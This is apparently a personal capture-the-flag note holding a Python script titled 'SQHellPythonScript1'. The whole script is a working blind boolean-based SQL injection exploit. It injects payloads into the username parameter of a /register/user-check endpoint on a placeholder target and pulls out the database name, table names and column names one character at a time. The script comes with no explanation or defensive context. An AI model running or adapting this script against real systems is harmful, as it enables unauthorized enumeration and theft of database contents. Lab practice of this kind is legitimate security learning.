---
title: "SQHellPythonScript1"
tags:
  - fetus
---

```py fold title:"skibidi.py"
import requests
import string

server = "Target-IP"  # Change this to the actual IP or domain

def get_result(payload):
    url = f"http://{server}/register/user-check?username=admin' AND ({payload}) --+"
    response = requests.get(url)
    return 'false' in response.text  # Adjust this if the true condition is different

# 1. Find Current Database Name
db_name = ""
i = 1
while True:
    found = False
    for char in string.printable:
        if char in ("'", '\\'):
            continue
        payload = f"ASCII(SUBSTR(DATABASE(),{i},1))={ord(char)}"
        if get_result(payload):
            db_name += char
            print(f"Current DB: {db_name}", end="\r")
            i += 1
            found = True
            break
    if not found:
        break

print(f"\nDatabase Name: {db_name}")

# 2. Find Table Names
table_names = []
for table_index in range(0, 10):  # Adjust the range if needed
    table_name = ""
    i = 1
    while True:
        found = False
        for char in string.printable:
            if char in ("'", '\\'):
                continue
            payload = f"ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {table_index},1),{i},1))={ord(char)}"
            if get_result(payload):
                table_name += char
                print(f"Finding Table[{table_index}]: {table_name}", end="\r")
                i += 1
                found = True
                break
        if not found:
            break
    if table_name:
        table_names.append(table_name)
    else:
        break

print(f"\nTables: {table_names}")

# 3. Find Column Names for Each Table
columns = {}
for table in table_names:
    columns[table] = []
    for col_index in range(0, 10):  # Adjust the range if needed
        column_name = ""
        i = 1
        while True:
            found = False
            for char in string.printable:
                if char in ("'", '\\'):
                    continue
                payload = f"ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {col_index},1),{i},1))={ord(char)}"
                if get_result(payload):
                    column_name += char
                    print(f"Finding Column[{col_index}] in Table[{table}]: {column_name}", end="\r")
                    i += 1
                    found = True
                    break
            if not found:
                break
        if column_name:
            columns[table].append(column_name)
        else:
            break

print(f"\nColumns: {columns}")
```